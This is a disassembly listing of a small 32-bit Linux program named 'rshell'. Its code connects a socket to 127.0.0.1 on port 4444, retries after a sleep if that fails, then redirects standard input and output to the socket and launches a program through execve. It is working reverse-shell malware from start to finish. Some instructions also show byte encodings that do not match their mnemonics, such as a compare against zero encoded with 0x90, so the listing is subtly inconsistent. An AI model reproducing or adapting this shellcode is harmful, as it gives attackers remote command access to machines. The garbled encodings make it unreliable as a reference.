
rshell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c0                	xor    %eax,%eax
 8049002:	b0 66                	mov    $0x66,%al
 8049004:	31 db                	xor    %ebx,%ebx
 8049006:	b3 01                	mov    $0x1,%bl
 8049008:	31 c9                	xor    %ecx,%ecx
 804900a:	51                   	push   %ecx
 804900b:	6a 01                	push   $0x1
 804900d:	6a 02                	push   $0x2
 804900f:	89 e1                	mov    %esp,%ecx
 8049011:	cd 80                	int    $0x80
 8049013:	31 d2                	xor    %edx,%edx
 8049015:	89 c2                	mov    %eax,%edx
 8049017:	b0 66                	mov    $0x66,%al
 8049019:	b3 03                	mov    $0x3,%bl
 804901b:	31 c9                	xor    %ecx,%ecx
 804901d:	68 7f 00 00 01       	push   $0x100007f
 8049022:	66 68 11 5c          	pushw  $0x5c11
 8049026:	66 6a 02             	pushw  $0x2
 8049029:	89 e6                	mov    %esp,%esi
 804902b:	6a 10                	push   $0x10
 804902d:	56                   	push   %esi
 804902e:	52                   	push   %edx
 804902f:	89 e1                	mov    %esp,%ecx
 8049031:	cd 80                	int    $0x80
 8049033:	83 f8 90             	cmp    $0x0,%eax
 8049036:	74 3a                	je     8049072 <dupfd>
 8049038:	ba 21 90 90 90       	mov    $0x21,%edx
 804903d:	b9 00 a0 04 08       	mov    $0x804a000,%ecx
 8049042:	bb 01 90 90 90       	mov    $0x1,%ebx
 8049047:	b8 04 90 90 90       	mov    $0x4,%eax
 804904c:	cd 80                	int    $0x80
 804904e:	31 c9                	xor    %ecx,%ecx
 8049050:	c7 05 41 a0 04 08 0a 	movl   $0xa,0x804a041
 8049057:	90 90 90 
 804905a:	c7 05 45 a0 04 08 00 	movl   $0x0,0x804a045
 8049061:	90 90 90 
 8049064:	b8 a2 00 00 00       	mov    $0xa2,%eax
 8049069:	bb 41 a0 04 08       	mov    $0x804a041,%ebx
 804906e:	cd 80                	int    $0x80
 8049070:	eb 8e                	jmp    8049000 <_start>

08049072 <dupfd>:
 8049072:	b0 3f                	mov    $0x3f,%al
 8049074:	89 d3                	mov    %edx,%ebx
 8049076:	31 c9                	xor    %ecx,%ecx
 8049078:	cd 80                	int    $0x80
 804907a:	b0 3f                	mov    $0x3f,%al
 804907c:	b1 01                	mov    $0x1,%cl
 804907e:	cd 80                	int    $0x80
 8049080:	b0 3f                	mov    $0x3f,%al
 8049082:	b1 02                	mov    $0x2,%cl
 8049084:	cd 80                	int    $0x80
 8049086:	b0 0b                	mov    $0xb,%al
 8049088:	bb 21 a0 04 08       	mov    $0x804a021,%ebx
 804908d:	b9 31 a0 04 08       	mov    $0x804a031,%ecx
 8049092:	ba 3d a0 04 08       	mov    $0x804a03d,%edx
 8049097:	cd 80                	int    $0x80
